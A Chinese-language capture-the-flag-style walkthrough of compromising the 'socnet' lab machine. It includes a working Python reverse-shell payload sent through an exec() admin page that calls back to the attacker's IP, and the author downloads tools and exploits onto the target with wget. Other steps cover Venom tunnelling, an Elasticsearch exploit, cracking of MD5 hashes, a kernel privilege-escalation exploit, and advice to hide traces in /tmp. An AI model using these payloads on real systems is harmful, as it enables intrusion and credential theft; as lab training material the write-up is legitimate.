1.3 渗透思路

2.操作记录

2.1 主机发现&信息收集

由于靶机和kali在同一网段，所以采用arp-sacn -l扫描网段主机，其中192.168.0.114是本机，猜测192.168.0.113是靶机。

nmap -sT -Pn 192.168.0.113探测发现113主机开放了22和5000端口

nmap -p22,5000 -sV -sT -Pn 192.168.0.113进一步探测端口上的服务

  • 发现22端口是ssh

  • 5000端口上的是http服务

  • 主机是ubuntu系统，主机上存在python环境

访问5000端口，看下web服务，页面如下，测试没有什么突破点，仅仅可以输入输出

由于是http服务，猜测可能存在其他隐藏路径，使用dirsearch -u http://192.168.0.113:5000扫描下路径,扫描发现存在/admin路径

访问界面发现这是一个代码测试页面，会将接收到的代码放到exec()进行执行

exec() 
Python 内建函数

定义和用法
exec() 函数执行指定的 Python 代码。
exec() 函数接受大量代码块，这与 eval() 函数仅接受单个表达式不同

可以执行python脚本反弹shell，我们可以浏览器搜索python反弹shell很容易找到相关代码,下面是随便找一个，需要修改ip地址和端口为我们正在操作的kali的ip和监听的端口

//payload
import socket,subprocess,os 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
s.connect(("192.168.0.114",6666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2) 
p=subprocess.call(["/bin/sh","-i"])

在输入payload之前我们首先需要在kali上启动监听nc -nvlp 6666以便接收shell，然后输入payload，点击Test code执行代码

提交之后，kali接受到反弹的shell,用id查下权限，用ls查下文件，发现是root权限,但查看文件时发现了一个Dockerfile文件,猜测可能时docker主机，需要进一步确认

  • 查看Dockerfile文件cat Dockerfile，内容如下，判断可能是docker

#docker build -t socnet .
#docker run -td --rm -p 8080:8080 socnet
FROM python:2.7-alpine
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
CMD ["python", "/app/main.py"]

  • 进一步判断，查看根目录下是否有dockerenv,ls /.dockerenv,发现存在，判断90%是docker容器

  • 最后判断，cat /proc/1/cgroup，如果cgroup内有docker文件判断就是docker容器

  • 判断依据：Linux初始化进程时，PID=1代表的是初始化进程的ID，如果1进程下面的cgroup文件包含docker文件，就说明这是个docker系统


2.2 内网发现

查看下当前ip，发现并不是192.168.0.113，而是172.17.0.3，说明这是一台内网的docker主机，自然而然的我们会想到将内网主机过滤下，看哪些存活

  • 方法：使用for循环来ping主机 ,我们使用linux发现一个网段就行，正常测试时要访问所有

//windows
//发现一个网段
for /l %i in (1,1,10) do ping -n 1 172.17.0.%i

//发现两个网段
for /l %i in (1,1,3) do for /l %j in (1,1,3) do ping -n 1 192.168.%i.%j

//linux
//发现一个网段
for i in $(seq 1 10);do ping -c 1 172.17.0.$i;done

//发现两个网段
for i in $(seq 1 10);do (for j in $(seq 1 10 );do ping -c 1 172.17.$i.$j;done)done

经过我们测试，发现内网只有三台主机，172.17.0.1、172.17.0.2、172.17.0.3，其中3是目前所在的靶机。


2.3 内网穿透

在发现了内网主机之后，我们需要对它们进行扫描，来判断各个主机上面的情况，但我们和内网默认是无法通信的，此时就需要做内网穿透，做个代理，让我们能够访问到内网主机。

我们使用Venom穿透工具来实现此功能

下载地址：https://github.com/Dliv3/Venom/releases

工具文件如下,由于靶机是ubuntu，我们需要使用的文件是admin_linux_x64和agent_linux_x64,admin放在本地，agent需要搞到靶机上

kali服务端开启端口监听：./admin_linux_x64 -lport 7777

进到Venmo文件夹下，开启http服务：python3 -m http.server 81，这一步是为了让靶机能够下载agent文件，端口哪个都行

靶机下载kali上的agent_linux_x64到本机：wget http://192.168.0.114:81/agent_linux_x64

客户端服务开启：

chmod +x agent_linux_x64给予执行权限

./agent_linux_x64 -rhost 192.168.0.114 -rport 7777这个要和刚才监听的端口一致

客户端设置好了之后，kali上服务端就会收到链接，使用show命令可以看到链接已经建立，goto 1转到节点，同时另外启动一个侦听端口socks 1080，方便我们链接进来

至此代理就已经设置好了。


2.4 代理利用

为了能让kali上的所有工具都能利用代理,需要使用另一个工具proxychains

修改vim /etc/proxychains4.conf挂载代理，就可以让kali上的工具访问到靶机了

将文件内socks4 127.0.0.1 9050修改为socks5 127.0.0.0 1080

以后工具使用代理只需要在前面写上proxychains就好


2.5 内网横向扩展

下面挂代理使用nmap进行扫描，proxychains nmap -Pn -sT 172.17.0.1

对172.17.0.1的扫描结果我们发现获取的端口信息和服务信息都和前面192.168.0.113的信息一样，由此判断172.17.0.1是主机面向内网的ip,使用浏览器挂代理访问下。

确定172.17.0.1就是宿主主机，也就是我们的目标。


对另外的主机进行扫描，proxychains nmap -Pn -sT 172.17.0.2，发现开了一个9200端口

再对端口上的服务进行判断，proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2

对此端口服务进行扫描，发现是Elasticsearch服务，且版本较老，kali上有相关exp可以直接searchsploit Elasticsearch搜索exp利用

搜索到exp后查vim 36337.py看下，发现是采用python2写的

采用proxychains python2 36337.py 172.17.0.2 进行破解连接

链接到之后id查看当前权限，是root权限，查看当前文件，发现一个passwords文件，猜测是账户密码文件

cat passwords查看文件内容，如下,账户密码，密码采用md5加密

john:3f8184a7343664553fcb5337a3138814 
test:861f194e9d6118f3d942a72be3e51749

破解md5网站：https://www.somd5.com/

john账户解密

破解完测试发现只有john可以使用，使用sudo -s尝试直接升级root用户失败，只是普通用户，后面还要本地提权


2.6 本地提权

提权常用的是利用linux内核来提权，刚才登陆时可以看到内核版本,也可以使用命令uname -a来查看内核版本

uname -a
Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

kali本地搜索内核版本查找exp，searchsploit linux 3.13

选择37292.c来利用,首先将文件复制到当前文件夹下

cp /usr/share/exploitdb/exploits/linux/local/37292.c .

vim 37292.c:查看下exp代码发现代码末尾会调用gcc来编译ofs-lib.c文件，这个操作在192.168.0.113靶机上是会报错的，因为靶机上没有gcc环境

改正措施

我们可以把ofs-lib.os文件和exp文件一同上传到靶机，改成只是调用文件，编译代码操作我们在kali本地完成,这时代码里的编译文件的代码也就不需要了，删除方框内编译代码即可。

本地编译gcc -o exp2 37292.c

寻找编译过后的ofs-lib.so文件，看是否存在，find /usr -nmae ofs-lib.so,存在直接复制到当前文件夹下

下面需要开启一个http服务，以便靶机能够把提权文件下载下来

python3 -m http.server 81

有一点需要注意，我们下载的文件需要放在tmp目录下，因为提权文件里写的路径是/tmp，而且tmp是存放临时文件的，会消除我们上传的文件，有利于隐藏攻击

进到tmp目录下给exp2赋予执行权限chmod +x exp2

执行exp2，查看权限，已经是root了，打靶完成


3.回顾总结

寻找目标

靶机和kali在同一网段，直接采用arp-sacn -l扫描主机；也可以采用nmap扫描

收集信息

发现靶机的端口，服务,利用dirsearch -u http://192.168.0.113:5000扫描目录发现/admin路径;其他扫描工具也可以

验证测试

测试/admin存在代码执行漏洞，直接传python代码反弹shell拿到web权限

当前主机分析

由于靶机描述存在Docker,且发现Dockerfile文件，猜测是Docker容器，看ip发现在内网，可以进行横向发现

进入内网&内网穿透

内网发现三台存活主机，继续进行信息收集，由于在内网，使用Venom做内网穿透，配置proxychains4方便工具利用穿透代理；

内网信息收集

连接代理，对内网其他主机进行扫描，发现172.17.0.1是靶机主体，发现172.17.0.2上存在Elasticsearch低版本代码执行漏洞；

kali漏洞exp利用

拿下172.17.0.2后发现上面存有账户密码，解密，测试，发现主机一普通账户

账户本地提权

收集信息知道靶机linux内核版本不高，存在越权漏洞，靶机下载kali上的越权文件实现本地越权。

痕迹隐藏

操作集中在/tmp夹下，linux会定时清理这文件夹下的文件，方便隐藏痕迹。
